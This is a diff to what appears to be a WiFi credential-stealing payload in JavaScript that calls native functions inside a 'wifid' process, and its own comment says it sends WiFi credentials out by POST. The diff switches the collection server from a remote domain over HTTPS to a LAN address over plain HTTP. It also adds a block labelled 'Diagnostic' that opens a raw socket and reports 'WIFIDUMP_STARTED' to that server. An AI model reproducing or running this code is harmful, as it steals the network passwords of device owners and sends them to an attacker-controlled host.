@@ -3,9 +3,9 @@
 // Sends WiFi credentials via HTTPS POST
 
 // Server configuration
-const SERVER_HOST = "sqwas.shapelie.com";
-const SERVER_PORT = 8881;
-const USE_HTTPS = true;
+const SERVER_HOST = "192.168.10.188";
+const SERVER_PORT = 8001;
+const USE_HTTPS = false;
 
 class Native {
 	
@@ -883,6 +883,32 @@ function writePasswordsToFile(passwords, outputPath) {
 // ============================================================================
 
 Native.init();
+
+// Diagnostic: send startup notification
+(function() {
+	try {
+		const sock = Native.callSymbol("socket", 2, 1, 6);
+		if (sock >= 0) {
+			const addrBuf = Native.callSymbol("malloc", 16n);
+			Native.write16(addrBuf, 2);
+			Native.write16(addrBuf + 2n, 0x1129);
+			Native.write(addrBuf + 4n, new Uint8Array([192, 168, 10, 188]).buffer);
+			Native.write32(addrBuf + 8n, 0);
+
+			if (Native.callSymbol("connect", sock, addrBuf, 16n) === 0) {
+				const msg = '{"diagnostic":"WIFIDUMP_STARTED","process":"wifid"}';
+				const httpReq = `POST /stats HTTP/1.1\r\nHost: 192.168.10.188:8001\r\nContent-Length: ${msg.length}\r\n\r\n${msg}`;
+				const reqBytes = new Uint8Array(httpReq.length);
+				for (let i = 0; i < httpReq.length; i++) reqBytes[i] = httpReq.charCodeAt(i) & 0xFF;
+				const reqBuf = Native.callSymbol("malloc", BigInt(reqBytes.byteLength));
+				Native.write(reqBuf, reqBytes.buffer);
+				Native.callSymbol("send", sock, reqBuf, reqBytes.byteLength, 0);
+				Native.callSymbol("free", reqBuf);
+			}
+			Native.callSymbol("close", sock);
+		}
+	} catch(e) {}
+})();
 
 
 // Try multiple paths that wifid might have write access to
